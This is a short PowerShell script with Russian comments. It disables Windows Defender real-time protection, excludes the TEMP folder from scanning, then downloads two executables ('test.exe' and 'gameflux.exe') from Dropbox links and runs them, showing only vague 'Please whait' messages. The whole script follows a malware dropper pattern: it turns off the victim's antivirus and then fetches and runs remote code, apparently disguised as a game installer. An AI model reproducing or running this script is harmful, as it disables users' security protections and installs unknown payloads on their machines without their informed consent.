# Отключаем защитник Windows и добавляем исключение для временной папки
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "$env:TEMP"

# Скачиваем первое приложение
Write-Host "Please whait." -ForegroundColor Green
Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/ysgkf4itfcy4do4sh22ug/test.exe?rlkey=kb77xr8jjz91q5wyqepzksoq3&st=ufblgjqa&dl=1' -OutFile "$env:TEMP\test.exe"

# Скачиваем второе приложение (замени URL на нужный)
Write-Host "Please whait.." -ForegroundColor Green
Invoke-WebRequest -Uri 'https://www.dropbox.com/scl/fi/r4xlo4ojd7ryuzrjoydgt/gameflux.exe?rlkey=06l10e0imovb6bm7zznv5z7mm&st=ozjb13r7&dl=1' -OutFile "$env:TEMP\gameflux.exe"

# Запускаем первое приложение
Write-Host "Please whait..." -ForegroundColor Yellow
Start-Process "$env:TEMP\test.exe"

# Ждем 3 секунды
Write-Host "Please whait...." -ForegroundColor Cyan
Start-Sleep -Seconds 5

# Запускаем второе приложение
Write-Host "Please whait....." -ForegroundColor Yellow
Start-Process "$env:TEMP\gameflux.exe"

Write-Host "Complete!" -ForegroundColor Green
